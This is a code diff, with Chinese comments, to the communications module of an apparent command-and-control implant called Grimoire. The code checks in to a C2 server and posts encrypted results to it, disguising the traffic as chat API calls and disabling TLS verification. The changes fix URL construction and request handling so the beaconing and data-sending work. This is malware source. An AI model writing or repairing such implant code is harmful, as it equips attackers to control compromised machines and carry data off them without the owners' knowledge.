@@ -139,6 +139,11 @@ namespace Grimoire::Comms {
         curl_easy_setopt(curl_handle_, CURLOPT_CONNECTTIMEOUT, 10L);
         curl_easy_setopt(curl_handle_, CURLOPT_TIMEOUT, 30L);
 
+
+        curl_easy_setopt(curl_handle_, CURLOPT_FORBID_REUSE, 1L);
+        curl_easy_setopt(curl_handle_, CURLOPT_FRESH_CONNECT, 1L);
+        curl_easy_setopt(curl_handle_, CURLOPT_NOSIGNAL, 1L);
+
         // SSL/TLS 配置 (对于 HTTPS 是必须的)
         if (c2_url_.find("https://") == 0){
             std::cout << "[Comms] WARNING: Disabling SSL verification for C2.\n";
@@ -157,7 +162,7 @@ namespace Grimoire::Comms {
         InitializeCurlHandle();
 
         // 设置完整的签入 URL: https://HOST:PORT/api/chat/login
-        std::string checkin_url = c2_url_ + "/api/chat/login";
+        std::string checkin_url = c2_url_ + "api/chat/login";
         curl_easy_setopt(curl_handle_, CURLOPT_URL, checkin_url.c_str());
 
         // 设置 POST 请求
@@ -241,9 +246,11 @@ namespace Grimoire::Comms {
 
 
     bool GrimoireComms::SendResult(const std::vector<unsigned char>& plaintext_to_send) {
+
         CURLcode res;
         std::string response_data; // 保持接收 body 的地方，虽然我们不关心
         std::string encrypted_payload_b64;
+        std::string ignored_response;
 
         try {
             // 构造内部负载（心跳信号）
@@ -267,9 +274,14 @@ namespace Grimoire::Comms {
             };
             std::string json_payload = request_payload.dump();
 
+
             // 初始化 cURL 句柄并设置 Header 回调
             InitializeCurlHandle();
 
+
+            curl_easy_setopt(curl_handle_, CURLOPT_COPYPOSTFIELDS, json_payload.c_str());
+            curl_easy_setopt(curl_handle_, CURLOPT_WRITEDATA, &ignored_response);
+            // curl_easy_setopt(curl_handle_, CURLOPT_POSTFIELDS, json_payload.c_str());
             // 设置 Header 回调和用户指针
             // 用户指针指向 GrimoireComms 实例，以便 HeaderCallback 可以访问 incoming_task_header_
             curl_easy_setopt(curl_handle_, CURLOPT_HEADERFUNCTION, HeaderCallback);
@@ -286,6 +298,8 @@ namespace Grimoire::Comms {
             curl_easy_setopt(curl_handle_, CURLOPT_HTTPHEADER, headers);
 
             res = curl_easy_perform(curl_handle_);
+
+            curl_slist_free_all(headers);
             // 检查 HTTP 状态码
             long http_code = 0;
             curl_easy_getinfo(curl_handle_, CURLINFO_RESPONSE_CODE, &http_code);
@@ -342,18 +356,22 @@ namespace Grimoire::Comms {
             curl_easy_setopt(curl_handle_, CURLOPT_HEADERDATA, this);
 
             // 设置 URL 和 POST 方法
-            std::string data_url = c2_url_ + "/api/chat/send";
+            std::string data_url = c2_url_ + "api/chat/send";
             curl_easy_setopt(curl_handle_, CURLOPT_URL, data_url.c_str());
             curl_easy_setopt(curl_handle_, CURLOPT_POST, 1L);
 
             // 设置 POST 字段和 HTTP 头
-            curl_easy_setopt(curl_handle_, CURLOPT_POSTFIELDS, json_payload.c_str());
+            curl_easy_setopt(curl_handle_, CURLOPT_COPYPOSTFIELDS, json_payload.c_str());
             curl_slist *headers = nullptr;
             headers = curl_slist_append(headers, "Content-Type: application/json");
             curl_easy_setopt(curl_handle_, CURLOPT_HTTPHEADER, headers);
+            curl_easy_setopt(curl_handle_, CURLOPT_WRITEDATA, &response_data);
+
 
             // 执行请求
             res = curl_easy_perform(curl_handle_);
+
+
             curl_slist_free_all(headers);
 
             if (res != CURLE_OK) {
